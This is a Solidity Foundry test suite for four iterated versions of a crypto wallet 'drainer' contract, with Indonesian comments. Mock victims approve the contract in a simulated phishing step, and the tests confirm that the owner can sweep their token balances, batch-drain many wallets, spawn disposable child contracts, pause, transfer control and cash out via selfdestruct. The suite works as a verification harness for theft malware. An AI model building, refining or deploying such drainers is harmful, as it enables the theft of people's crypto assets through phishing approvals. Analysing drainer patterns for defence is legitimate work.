// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "./DrainerEvolusi.sol";

// ============================================================
// MOCK ERC20 — buat testing semua versi drainer
// ============================================================
contract MockToken is IERC20 {
    string public name;
    uint8 public decimals = 18;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    uint256 public totalSupply;

    constructor(string memory _name) { name = _name; }

    function mint(address to, uint256 amt) external {
        balanceOf[to] += amt;
        totalSupply += amt;
    }

    function approve(address spender, uint256 amt) external returns (bool) {
        allowance[msg.sender][spender] = amt;
        return true;
    }

    function transfer(address to, uint256 amt) external returns (bool) {
        require(balanceOf[msg.sender] >= amt, "insufficient");
        balanceOf[msg.sender] -= amt;
        balanceOf[to] += amt;
        return true;
    }

    function transferFrom(address from, address to, uint256 amt) external returns (bool) {
        require(balanceOf[from] >= amt, "insufficient balance");
        require(allowance[from][msg.sender] >= amt, "insufficient allowance");
        allowance[from][msg.sender] -= amt;
        balanceOf[from] -= amt;
        balanceOf[to] += amt;
        return true;
    }
}

// ============================================================
// V1 TESTS — Basic Drainer
// ============================================================
contract DrainerV1Test is Test {
    DrainerV1_Basic drainer;
    MockToken tokenA;
    MockToken tokenB;
    address owner = address(0xAAAA);
    address victim1 = address(0x1111);
    address victim2 = address(0x2222);
    address victim3 = address(0x3333);

    function setUp() public {
        vm.startPrank(owner);
        drainer = new DrainerV1_Basic();
        tokenA = new MockToken("TokenA");
        tokenB = new MockToken("TokenB");
        vm.stopPrank();

        // Setup victims with balances + approvals
        tokenA.mint(victim1, 1000 ether);
        tokenA.mint(victim2, 500 ether);
        tokenA.mint(victim3, 200 ether);
        tokenB.mint(victim1, 50 ether);
        tokenB.mint(victim2, 30 ether);

        // Victims approve drainer (simulating phishing)
        vm.prank(victim1); tokenA.approve(address(drainer), type(uint256).max);
        vm.prank(victim2); tokenA.approve(address(drainer), type(uint256).max);
        vm.prank(victim3); tokenA.approve(address(drainer), 100 ether); // partial
        vm.prank(victim1); tokenB.approve(address(drainer), type(uint256).max);
        vm.prank(victim2); tokenB.approve(address(drainer), type(uint256).max);
    }

    function test_V1_Owner() public view {
        assertEq(drainer.owner(), owner);
    }

    function test_V1_Setup() public {
        address[] memory tks = new address[](2);
        tks[0] = address(tokenA);
        tks[1] = address(tokenB);
        vm.prank(owner);
        drainer.setup(tks);
        assertEq(drainer.tokens(0), address(tokenA));
        assertEq(drainer.tokens(1), address(tokenB));
    }

    function test_V1_DrainAll() public {
        // Setup
        address[] memory tks = new address[](2);
        tks[0] = address(tokenA); tks[1] = address(tokenB);
        vm.startPrank(owner);
        drainer.setup(tks);

        address[] memory vct = new address[](3);
        vct[0] = victim1; vct[1] = victim2; vct[2] = victim3;
        drainer.add(vct);

        uint total = drainer.drain();
        vm.stopPrank();

        // Verify: all tokens drained to owner
        assertEq(tokenA.balanceOf(owner), 1000 ether + 500 ether + 100 ether); // victim3 capped at allowance
        assertEq(tokenB.balanceOf(owner), 50 ether + 30 ether);
        assertEq(tokenA.balanceOf(victim1), 0);
        assertEq(tokenA.balanceOf(victim2), 0);
        assertEq(tokenA.balanceOf(victim3), 100 ether); // 200 - 100 allowance = 100 left
        assertTrue(total > 0);
    }

    function test_V1_RevertNonOwner() public {
        vm.prank(victim1);
        vm.expectRevert();
        drainer.drain();
    }

    function test_V1_Selfdestruct() public {
        // Post-Cancun (EIP-6780): selfdestruct sends ETH but doesn't delete code
        vm.deal(address(drainer), 2 ether);
        uint balBefore = owner.balance;
        vm.prank(owner);
        drainer.kill();
        assertEq(owner.balance, balBefore + 2 ether);
    }
}

// ============================================================
// V2 TESTS — 2-Layer (Main + Child)
// ============================================================
contract DrainerV2Test is Test {
    DrainerV2_Main main;
    MockToken token;
    address owner = address(0xBBBB);
    address attacker = address(0xCCCC);
    address victim1 = address(0x1111);
    address victim2 = address(0x2222);

    function setUp() public {
        vm.startPrank(owner);
        main = new DrainerV2_Main();
        token = new MockToken("V2Token");
        vm.stopPrank();

        token.mint(victim1, 1000 ether);
        token.mint(victim2, 800 ether);

        vm.prank(victim1); token.approve(address(main), type(uint256).max);
        vm.prank(victim2); token.approve(address(main), 500 ether);
    }

    function test_V2_Register() public {
        address[] memory tks = new address[](1);
        tks[0] = address(token);
        vm.startPrank(owner);
        main.setup(tks);

        address[] memory vct = new address[](2);
        vct[0] = victim1; vct[1] = victim2;
        main.register(vct);
        vm.stopPrank();

        assertTrue(main.isVictim(victim1));
        assertTrue(main.isVictim(victim2));
        assertTrue(main.isToken(address(token)));
    }

    function test_V2_Sweep() public {
        address[] memory vct = new address[](2);
        vct[0] = victim1; vct[1] = victim2;
        vm.startPrank(owner);
        main.register(vct);
        uint total = main.sweep(address(token), owner);
        vm.stopPrank();

        assertEq(token.balanceOf(owner), 1000 ether + 500 ether);
        assertEq(token.balanceOf(victim1), 0);
        assertEq(token.balanceOf(victim2), 300 ether); // 800 - 500 allowance
        assertEq(total, 1500 ether);
    }

    function test_V2_Scan() public {
        address[] memory vct = new address[](2);
        vct[0] = victim1; vct[1] = victim2;
        vm.startPrank(owner);
        main.register(vct);

        (address[] memory list, uint[] memory amounts, uint total) = main.scan(address(token));
        vm.stopPrank();

        assertEq(list.length, 2);
        assertEq(amounts[0], 1000 ether);
        assertEq(amounts[1], 500 ether);
        assertEq(total, 1500 ether);
    }

    function test_V2_SpawnChild() public {
        vm.prank(owner);
        address child = main.spawn(bytes32(uint256(1)), attacker);
        assertTrue(child != address(0));
        assertEq(main.exploitCount(), 1);

        // Child has code
        uint size;
        assembly { size := extcodesize(child) }
        assertTrue(size > 0);
    }

    function test_V2_ChildPull() public {
        // Spawn child
        vm.prank(owner);
        address child = main.spawn(bytes32(uint256(42)), attacker);

        // Victims approve child
        vm.prank(victim1); token.approve(child, type(uint256).max);
        vm.prank(victim2); token.approve(child, 200 ether);

        // Pull from child
        address[] memory targets = new address[](2);
        targets[0] = victim1; targets[1] = victim2;
        vm.prank(attacker);
        DrainerV2_Child(payable(child)).pull(address(token), targets, attacker);

        assertEq(token.balanceOf(attacker), 1000 ether + 200 ether);
        // Post-Cancun (EIP-6780): selfdestruct only deletes code if same tx as deploy
        // Child was deployed earlier, so code persists — just verify funds moved
        assertEq(token.balanceOf(victim1), 0);
        assertEq(token.balanceOf(victim2), 600 ether); // 800 - 200
    }

    function test_V2_Delegate() public {
        // delegatecall to another contract's function
        // Just test it doesn't revert with valid target
        vm.prank(owner);
        // Calling delegate with empty data to self (no-op but tests access control)
        vm.expectRevert();
        main.delegate(address(main), hex"deadbeef");
    }

    function test_V2_RevertNonOwner() public {
        vm.prank(victim1);
        vm.expectRevert();
        main.sweep(address(token), victim1);
    }
}

// ============================================================
// V3 TESTS — 8 Functions (Attacker Pattern)
// ============================================================
contract DrainerV3Test is Test {
    DrainerV3_8Func drainer;
    MockToken token;
    address owner = address(0xDDDD);
    address victim1 = address(0x1111);
    address victim2 = address(0x2222);
    address victim3 = address(0x3333);

    function setUp() public {
        vm.startPrank(owner);
        drainer = new DrainerV3_8Func();
        token = new MockToken("V3Token");
        vm.stopPrank();

        token.mint(victim1, 2000 ether);
        token.mint(victim2, 1500 ether);
        token.mint(victim3, 300 ether);

        vm.prank(victim1); token.approve(address(drainer), type(uint256).max);
        vm.prank(victim2); token.approve(address(drainer), 1000 ether);
        vm.prank(victim3); token.approve(address(drainer), type(uint256).max);
    }

    function test_V3_Init() public {
        address[] memory tks = new address[](1);
        tks[0] = address(token);
        vm.prank(owner);
        drainer.init(8453, tks); // Base chainId
        // No revert = pass
    }

    function test_V3_Register() public {
        address[] memory vct = new address[](3);
        vct[0] = victim1; vct[1] = victim2; vct[2] = victim3;
        vm.prank(owner);
        drainer.register(vct);
        // Verify via report
        (address[] memory list,, uint vCount,) = drainer.report();
        assertEq(vCount, 3);
        assertEq(list[0], victim1);
    }

    function test_V3_Sweep() public {
        address[] memory vct = new address[](3);
        vct[0] = victim1; vct[1] = victim2; vct[2] = victim3;
        vm.startPrank(owner);
        drainer.register(vct);
        uint total = drainer.sweep(address(token), owner);
        vm.stopPrank();

        // victim1: 2000 (max allowance), victim2: 1000 (capped), victim3: 300 (max)
        assertEq(total, 3300 ether);
        assertEq(token.balanceOf(owner), 3300 ether);
        assertEq(token.balanceOf(victim2), 500 ether);
    }

    function test_V3_Report() public {
        address[] memory tks = new address[](1);
        tks[0] = address(token);
        address[] memory vct = new address[](2);
        vct[0] = victim1; vct[1] = victim2;

        vm.startPrank(owner);
        drainer.init(1, tks);
        drainer.register(vct);
        (address[] memory vList, address[] memory tList, uint vc, uint tc) = drainer.report();
        vm.stopPrank();

        assertEq(vc, 2);
        assertEq(tc, 1);
        assertEq(tList[0], address(token));
    }

    function test_V3_Control_Pause() public {
        vm.prank(owner);
        drainer.control(2, address(0)); // pause
        // No direct getter for _p, but no revert = pass
    }

    function test_V3_Control_TransferOwnership() public {
        address newOwner = address(0xEEEE);
        vm.prank(owner);
        drainer.control(1, newOwner);
        // Old owner should now fail
        vm.prank(owner);
        vm.expectRevert();
        drainer.control(2, address(0));
    }

    function test_V3_Control_Selfdestruct() public {
        // Post-Cancun (EIP-6780): selfdestruct only deletes code in same tx as deploy
        // So we just verify the call succeeds and ETH is sent to owner
        vm.deal(address(drainer), 1 ether);
        uint balBefore = owner.balance;
        vm.prank(owner);
        drainer.control(4, payable(owner));
        assertEq(owner.balance, balBefore + 1 ether);
    }

    function test_V3_Inspect() public {
        address[] memory suspects = new address[](3);
        suspects[0] = victim1; suspects[1] = victim2; suspects[2] = victim3;

        (uint[] memory amts, uint tot) = drainer.inspect(address(token), suspects);
        assertEq(amts[0], 2000 ether);
        assertEq(amts[1], 1000 ether); // capped by allowance
        assertEq(amts[2], 300 ether);
        assertEq(tot, 3300 ether);
    }

    function test_V3_Spawn() public {
        vm.prank(owner);
        address child = drainer.spawn(bytes32(uint256(99)), address(0xFFFF));
        assertTrue(child != address(0));
        uint size;
        assembly { size := extcodesize(child) }
        assertTrue(size > 0);
    }

    function test_V3_RevertNonOwner() public {
        vm.prank(victim1);
        vm.expectRevert();
        drainer.sweep(address(token), victim1);
    }
}

// ============================================================
// V4 TESTS — Complete (Permit2 + Multi-chain + Zero Storage)
// ============================================================
contract DrainerV4Test is Test {
    DrainerV4_Complete drainer;
    MockToken token;
    MockToken token2;
    address owner = address(0xEEEE);
    address victim1 = address(0x1111);
    address victim2 = address(0x2222);
    address victim3 = address(0x3333);

    function setUp() public {
        vm.startPrank(owner);
        drainer = new DrainerV4_Complete();
        token = new MockToken("V4Token");
        token2 = new MockToken("V4Token2");
        vm.stopPrank();

        token.mint(victim1, 5000 ether);
        token.mint(victim2, 3000 ether);
        token.mint(victim3, 1000 ether);
        token2.mint(victim1, 100 ether);
        token2.mint(victim2, 50 ether);

        vm.prank(victim1); token.approve(address(drainer), type(uint256).max);
        vm.prank(victim2); token.approve(address(drainer), 2000 ether);
        vm.prank(victim3); token.approve(address(drainer), type(uint256).max);
        vm.prank(victim1); token2.approve(address(drainer), type(uint256).max);
        vm.prank(victim2); token2.approve(address(drainer), type(uint256).max);
    }

    function test_V4_Init() public {
        address[] memory tks = new address[](0);
        vm.prank(owner);
        drainer.init(8453, tks);
        (uint cid,,, ) = drainer.stats();
        assertEq(cid, 8453);
    }

    function test_V4_Sweep_MultiToken() public {
        address[] memory tks = new address[](2);
        tks[0] = address(token); tks[1] = address(token2);
        address[] memory vct = new address[](3);
        vct[0] = victim1; vct[1] = victim2; vct[2] = victim3;

        vm.prank(owner);
        uint total = drainer.sweep(tks, vct, owner);

        // token: 5000 + 2000 + 1000 = 8000
        // token2: 100 + 50 = 150
        assertEq(token.balanceOf(owner), 8000 ether);
        assertEq(token2.balanceOf(owner), 150 ether);
        assertTrue(total > 0);
    }

    function test_V4_Sweep_ZeroStorage() public {
        // V4 doesn't store victims — pass directly each time
        address[] memory tks = new address[](1);
        tks[0] = address(token);
        address[] memory vct = new address[](1);
        vct[0] = victim1;

        vm.prank(owner);
        drainer.sweep(tks, vct, owner);

        assertEq(token.balanceOf(victim1), 0);
        assertEq(token.balanceOf(owner), 5000 ether);
    }

    function test_V4_Discover() public {
        address[] memory suspects = new address[](3);
        suspects[0] = victim1; suspects[1] = victim2; suspects[2] = victim3;

        vm.prank(owner);
        uint total = drainer.discover(address(token), suspects, owner);

        assertEq(total, 5000 ether + 2000 ether + 1000 ether);
        assertEq(token.balanceOf(owner), 8000 ether);
    }

    function test_V4_Stats() public {
        (uint cid, uint drained, bool paused, uint exploits) = drainer.stats();
        assertEq(cid, block.chainid);
        assertEq(drained, 0);
        assertEq(paused, false);
        assertEq(exploits, 0);
    }

    function test_V4_Control_Pause() public {
        vm.prank(owner);
        drainer.control(2, address(0));
        (,, bool paused,) = drainer.stats();
        assertTrue(paused);

        vm.prank(owner);
        drainer.control(3, address(0));
        (,, paused,) = drainer.stats();
        assertFalse(paused);
    }

    function test_V4_Control_Ownership() public {
        address newOwner = address(0xFFFF);
        vm.prank(owner);
        drainer.control(1, newOwner);

        // Old owner locked out
        vm.prank(owner);
        vm.expectRevert();
        drainer.control(2, address(0));

        // New owner works
        vm.prank(newOwner);
        drainer.control(2, address(0));
    }

    function test_V4_Control_Withdraw() public {
        // Send tokens to drainer, then withdraw via control(5)
        token.mint(address(drainer), 999 ether);
        vm.prank(owner);
        drainer.control(5, address(token));
        assertEq(token.balanceOf(owner), 999 ether);
    }

    function test_V4_Inspect() public {
        address[] memory suspects = new address[](3);
        suspects[0] = victim1; suspects[1] = victim2; suspects[2] = victim3;

        (uint[] memory amts, uint tot) = drainer.inspect(address(token), suspects);
        assertEq(amts[0], 5000 ether);
        assertEq(amts[1], 2000 ether); // capped
        assertEq(amts[2], 1000 ether);
        assertEq(tot, 8000 ether);
    }

    function test_V4_Spawn() public {
        vm.prank(owner);
        address child = drainer.spawn(bytes32(uint256(7)), address(0xABCD));
        assertTrue(child != address(0));
        (,,, uint exploits) = drainer.stats();
        assertEq(exploits, 1);
    }

    function test_V4_Delegate() public {
        // delegatecall with invalid data should revert
        vm.prank(owner);
        vm.expectRevert();
        drainer.delegate(address(token), hex"deadbeef");
    }

    function test_V4_RevertNonOwner() public {
        address[] memory tks = new address[](1);
        tks[0] = address(token);
        address[] memory vct = new address[](1);
        vct[0] = victim1;

        vm.prank(victim1);
        vm.expectRevert();
        drainer.sweep(tks, vct, victim1);
    }

    function test_V4_MaxBatch64() public {
        // V4 caps at M=64 per call
        address[] memory tks = new address[](1);
        tks[0] = address(token);
        // Create 70 victims — only first 64 processed
        address[] memory vct = new address[](70);
        for (uint i = 0; i < 70; i++) {
            vct[i] = address(uint160(0x10000 + i));
            token.mint(vct[i], 10 ether);
            vm.prank(vct[i]);
            token.approve(address(drainer), type(uint256).max);
        }

        vm.prank(owner);
        drainer.sweep(tks, vct, owner);

        // First 64 drained, last 6 untouched
        assertEq(token.balanceOf(vct[0]), 0);
        assertEq(token.balanceOf(vct[63]), 0);
        assertEq(token.balanceOf(vct[64]), 10 ether); // not processed
        assertEq(token.balanceOf(vct[69]), 10 ether); // not processed
    }
}
